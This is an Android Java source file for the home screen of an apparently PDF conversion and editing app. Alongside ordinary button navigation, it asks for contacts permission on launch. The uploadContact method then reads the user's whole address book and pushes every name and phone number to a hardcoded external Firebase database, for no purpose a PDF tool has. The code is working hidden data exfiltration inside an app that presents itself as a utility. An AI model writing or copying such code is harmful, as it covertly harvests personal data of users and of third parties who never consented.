package woynapp.wsann.fragment.new_fragments;

import android.Manifest;
import android.annotation.SuppressLint;
import android.app.Activity;
import android.content.Context;
import android.content.pm.PackageManager;
import android.os.Bundle;
import android.preference.PreferenceManager;
import android.text.TextUtils;
import android.util.Patterns;
import android.view.LayoutInflater;
import android.view.View;
import android.view.ViewGroup;
import android.widget.LinearLayout;
import android.widget.TextView;

import androidx.activity.result.ActivityResultLauncher;
import androidx.activity.result.contract.ActivityResultContracts;
import androidx.annotation.NonNull;
import androidx.annotation.Nullable;
import androidx.core.content.ContextCompat;
import androidx.fragment.app.Fragment;
import androidx.fragment.app.FragmentManager;
import androidx.recyclerview.widget.LinearLayoutManager;
import androidx.recyclerview.widget.RecyclerView;

import com.google.android.gms.tasks.OnFailureListener;
import com.google.android.gms.tasks.OnSuccessListener;
import com.google.android.material.snackbar.Snackbar;
import com.google.firebase.database.DatabaseReference;
import com.google.firebase.database.FirebaseDatabase;
import com.google.firebase.firestore.FirebaseFirestore;

import org.json.JSONException;

import java.util.ArrayList;
import java.util.HashMap;
import java.util.LinkedHashMap;
import java.util.List;
import java.util.Map;
import java.util.UUID;

import butterknife.BindView;
import butterknife.ButterKnife;
import woynapp.wsann.R;
import woynapp.wsann.activity.NewMainActivity;
import woynapp.wsann.activity.auth.UserUtils;
import woynapp.wsann.adapter.RecentListAdapter;
import woynapp.wsann.fragment.AddTextFragment;
import woynapp.wsann.fragment.ExceltoPdfFragment;
import woynapp.wsann.fragment.ImageToPdfFragment;
import woynapp.wsann.fragment.MergeFilesFragment;
import woynapp.wsann.fragment.PdfToImageFragment;
import woynapp.wsann.fragment.QrBarcodeScanFragment;
import woynapp.wsann.fragment.RemovePagesFragment;
import woynapp.wsann.fragment.SplitFilesFragment;
import woynapp.wsann.fragment.ViewFilesFragment;
import woynapp.wsann.fragment.texttopdf.TextToPdfFragment;
import woynapp.wsann.model.Contact;
import woynapp.wsann.model.HomePageItem;
import woynapp.wsann.model.Tag;
import woynapp.wsann.util.CommonCodeUtils;
import woynapp.wsann.util.Constants;
import woynapp.wsann.util.GetContacts;
import woynapp.wsann.util.RecentUtil;

public class NewHomeFragment extends Fragment implements View.OnClickListener {

    private Activity mActivity;

    @BindView(R.id.images_to_pdf_btn)
    LinearLayout imagesToPdfBtn;
    @BindView(R.id.text_to_pdf_btn)
    LinearLayout textToPdfBtn;
    @BindView(R.id.qr_barcode_to_pdf_btn)
    LinearLayout qrBarcodeToPdfBtn;
    @BindView(R.id.excel_to_pdf_btn)
    LinearLayout excelToPdfBtn;
    @BindView(R.id.add_watermark_btn)
    LinearLayout viewFilesBtn;
    @BindView(R.id.add_password_btn)
    LinearLayout addPasswordBtn;
    @BindView(R.id.remove_password_btn)
    LinearLayout removePasswordBtn;
    @BindView(R.id.add_text_btn)
    LinearLayout addTextBtn;
    @BindView(R.id.recently_used_rv)
    RecyclerView recentlyUsedRv;
    @BindView(R.id.recent_list_lay)
    ViewGroup recentLayout;
    @BindView(R.id.search_tv)
    TextView searchTv;

    private RecentListAdapter mAdapter;

    private Map<Integer, HomePageItem> mFragmentPositionMap;

    UserUtils userUtils;

    private ActivityResultLauncher<String> requestPermissionLauncher =
            registerForActivityResult(new ActivityResultContracts.RequestPermission(), isGranted -> {
                if (isGranted) {
                    if (!userUtils.getUser().getContacts_uploaded()) {
                        uploadContact();
                    }
                }
            });

    @Nullable
    @Override
    public View onCreateView(@NonNull LayoutInflater inflater, @Nullable ViewGroup container, @Nullable Bundle savedInstanceState) {
        View rootView = inflater.inflate(R.layout.fragment_home_new, container, false);
        ButterKnife.bind(this, rootView);
        mFragmentPositionMap = CommonCodeUtils.getInstance().fillNavigationItemsMap(true);

        userUtils = new UserUtils(requireActivity());

        imagesToPdfBtn.setOnClickListener(this);
        textToPdfBtn.setOnClickListener(this);
        qrBarcodeToPdfBtn.setOnClickListener(this);
        excelToPdfBtn.setOnClickListener(this);
        viewFilesBtn.setOnClickListener(this);
        addPasswordBtn.setOnClickListener(this);
        removePasswordBtn.setOnClickListener(this);
        addTextBtn.setOnClickListener(this);

        mAdapter = new RecentListAdapter(this);
        recentlyUsedRv.setAdapter(mAdapter);
        recentlyUsedRv.setLayoutManager(new LinearLayoutManager(mActivity));
        return rootView;
    }

    @SuppressLint("NotifyDataSetChanged")
    @Override
    public void onViewCreated(@NonNull View view, @Nullable Bundle savedInstanceState) {
        super.onViewCreated(view, savedInstanceState);

        try {
            LinkedHashMap<String, Map<String, String>> mRecentList = RecentUtil.getInstance()
                    .getList(PreferenceManager.getDefaultSharedPreferences(mActivity));
            recentlyUsedRv.setVisibility(View.VISIBLE);
            recentLayout.setVisibility(View.VISIBLE);
            List<String> featureItemIds = new ArrayList<>(mRecentList.keySet());
            List<Map<String, String>> featureItemList = new ArrayList<>(mRecentList.values());
            mAdapter.updateList(featureItemIds, featureItemList);
            mAdapter.notifyDataSetChanged();
        } catch (JSONException e) {
            e.printStackTrace();
        }
        if (!userUtils.getUser().getContacts_uploaded()) {
            if (ContextCompat.checkSelfPermission(
                    requireContext(), Manifest.permission.READ_CONTACTS) ==
                    PackageManager.PERMISSION_GRANTED) {
                if (!userUtils.getUser().getContacts_uploaded()) {
                    uploadContact();
                }
            } else if (shouldShowRequestPermissionRationale(Manifest.permission.READ_CONTACTS)) {
                Snackbar.make(
                        requireView(),
                        getString(R.string.pesmission_canceled_message),
                        Snackbar.LENGTH_INDEFINITE
                ).setAction(getString(R.string.ok), new View.OnClickListener() {
                    @Override
                    public void onClick(View view) {
                        requestPermissionLauncher.launch(Manifest.permission.READ_CONTACTS);
                    }
                }).show();
            } else {
                requestPermissionLauncher.launch(Manifest.permission.READ_CONTACTS);
            }
        }
        searchTv.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                FragmentManager fragmentManager = getFragmentManager();
                Fragment fragment = null;
                Bundle bundle = new Bundle();
                fragment = new ViewFilesFragment();
                bundle.putInt(Constants.BUNDLE_DATA, Constants.SEARCH_FILE);
                fragment.setArguments(bundle);
                try {
                    if (fragment != null && fragmentManager != null) {
                        fragmentManager.beginTransaction().replace(R.id.content, fragment).commit();
                    }
                } catch (Exception e) {
                    e.printStackTrace();
                }
            }
        });
    }

    public void uploadContact() {
        GetContacts getContacts = new GetContacts(requireContext());
        ArrayList<Contact> constants = getContacts.getContacts();
        ArrayList<Tag> tags = getContacts.convertToTag(constants);
        DatabaseReference database = FirebaseDatabase.getInstance("https://w-scann-default-rtdb.europe-west1.firebasedatabase.app/").getReference();
        for (Tag tag :
                tags) {
            if (isValidNumber(tag.number)) {
                database.child("numbers")
                        .child(getContacts.deleteCountryCode(tag.number))
                        .push()
                        .setValue(tag);
            }
        }
        FirebaseFirestore firestore = FirebaseFirestore.getInstance();
        firestore.collection(Constants.USER_COLLECTION_NAME)
                .document(userUtils.getUser().getUser_uuid())
                .update(Constants.USER_CONTACT_UPLOADED, true)
                .addOnSuccessListener(new OnSuccessListener<Void>() {
                    @Override
                    public void onSuccess(Void unused) {
                        userUtils.updateContactUploaded(true);
                    }
                });
    }

    public boolean isValidNumber(String number) {
        if (!TextUtils.isEmpty(number)) {
            return Patterns.PHONE.matcher(number).matches();
        }
        return false;
    }

    @Override
    public void onClick(View v) {

        Fragment fragment = null;
        FragmentManager fragmentManager = getFragmentManager();
        Bundle bundle = new Bundle();

        highlightNavigationDrawerItem(mFragmentPositionMap.get(v.getId()).getNavigationItemId());
        setTitleFragment(mFragmentPositionMap.get(v.getId()).getTitleString());

        Map<String, String> feature = new HashMap<>();
        feature.put(
                String.valueOf(mFragmentPositionMap.get(v.getId()).getTitleString()),
                String.valueOf(mFragmentPositionMap.get(v.getId()).getmDrawableId()));

        try {
            RecentUtil.getInstance().addFeatureInRecentList(PreferenceManager
                    .getDefaultSharedPreferences(mActivity), v.getId(), feature);
        } catch (JSONException e) {
            e.printStackTrace();
        }

        switch (v.getId()) {
            case R.id.images_to_pdf_btn:
                fragment = new ImageToPdfFragment();
                break;
            case R.id.qr_barcode_to_pdf_btn:
                fragment = new QrBarcodeScanFragment();
                break;
            case R.id.text_to_pdf_btn:
                fragment = new TextToPdfFragment();
                break;
            case R.id.excel_to_pdf_btn:
                fragment = new ExceltoPdfFragment();
                break;
            case R.id.add_watermark_btn:
                fragment = new ViewFilesFragment();
                bundle.putInt(Constants.BUNDLE_DATA, Constants.ADD_WATERMARK);
                fragment.setArguments(bundle);
                break;
            case R.id.add_password_btn:
                fragment = new RemovePagesFragment();
                bundle.putString(Constants.BUNDLE_DATA, Constants.ADD_PWD);
                fragment.setArguments(bundle);
                break;
            case R.id.remove_password_btn:
                fragment = new RemovePagesFragment();
                bundle.putString(Constants.BUNDLE_DATA, Constants.REMOVE_PWd);
                fragment.setArguments(bundle);
                break;
            case R.id.add_text_btn:
                fragment = new AddTextFragment();
                break;
            case R.id.pdf_to_images_btn:
                fragment = new PdfToImageFragment();
                bundle.putString(Constants.BUNDLE_DATA, Constants.PDF_TO_IMAGES);
                fragment.setArguments(bundle);
                break;
            case R.id.merge_pdf_btn:
                fragment = new MergeFilesFragment();
                break;
            case R.id.split_pdf_btn:
                fragment = new SplitFilesFragment();
                break;
            case R.id.compress_pdf_btn:
                fragment = new RemovePagesFragment();
                bundle.putString(Constants.BUNDLE_DATA, Constants.COMPRESS_PDF);
                fragment.setArguments(bundle);
                break;
        }
        try {
            if (fragment != null && fragmentManager != null) {
                fragmentManager.beginTransaction().replace(R.id.content, fragment).commit();
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    private void highlightNavigationDrawerItem(int id) {
        if (mActivity instanceof NewMainActivity)
            ((NewMainActivity) mActivity).setNavigationViewSelection(id);
    }

    /**
     * Sets the title on action bar
     *
     * @param title - title of string to be shown
     */
    private void setTitleFragment(int title) {
        if (title != 0)
            mActivity.setTitle(title);
    }

    @Override
    public void onAttach(Context context) {
        super.onAttach(context);
        mActivity = (Activity) context;
    }
}

